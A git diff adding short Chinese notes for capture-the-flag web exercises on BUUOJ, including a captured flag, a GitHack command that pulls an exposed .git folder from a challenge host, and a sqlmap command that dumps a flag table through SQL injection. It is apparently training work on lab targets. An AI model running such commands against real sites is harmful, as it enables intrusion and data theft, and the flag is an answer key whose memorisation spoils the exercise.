@@ -13,3 +13,18 @@ index.php~ -> flag2:s_v3ry_im
 
 n1book{info_1s_v3ry_imp0rtant_hack}
 ```
+
+# [第一章 web入门]粗心的小李
+使用 GitHack 下载 .git 文件夹
+```sh
+'C:\Python27\python.exe' .\GitHack.py -u http://bd8453b7-fcb1-4725-8962-3bb1cb3dcef9.node5.buuoj.cn:81/.git
+cd .\dist\bd8453b7-fcb1-4725-8962-3bb1cb3dcef9.node5.buuoj.cn_81\
+git log
+git show 213b7e386e9b0b406d91fae58bf8be11a58c3f88
+```
+
+# [第一章 web入门]SQL注入-1
+使用 sqlmap
+```sh
+python .\sqlmap.py -u http://54313594-3a8c-4a9f-afdf-1c4c3a6d32a9.node5.buuoj.cn:81/index.php?id=1 --threads 10 -D note -T fl4g -C fllllag --dump
+```
